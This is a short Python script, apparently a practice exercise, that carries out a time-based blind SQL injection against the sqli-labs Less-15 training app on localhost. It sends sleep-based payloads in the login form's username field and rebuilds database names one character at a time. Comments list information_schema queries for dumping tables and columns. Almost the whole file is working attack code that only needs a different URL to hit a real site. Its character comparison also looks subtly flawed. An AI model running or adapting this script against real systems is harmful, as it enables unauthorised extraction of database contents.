#! -*- encoding:utf-8 -*-
# python3
# author: leticia

import requests
#用这里的语句分别替换id中的内容即可爆库、表、字段
#select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA
#select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA = 'xxx'
#select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_SCHEMA = 'xxx' and TABLE_NAME = 'xxx'
dic='0123456789abcdefghijklmnopqrstuvwxyz,'
url='http://127.0.0.1/sqli-labs/Less-15/'
string=''
for i in range(1,100):
    for j in dic:
        uname="admin\' and if((substr((select group_concat(schema_name) from information_schema.schemata limit 0,1),{0},1)={1}),sleep(3),0)#".format(str(i),ascii(j))
        data = {"uname": uname,
                "passwd": "1"
                }
        #print(uname)
        r=requests.post(url,data=data)
        sec=r.elapsed.seconds
        if sec > 2:
            string+=j
            print(string)
            break
print(string)
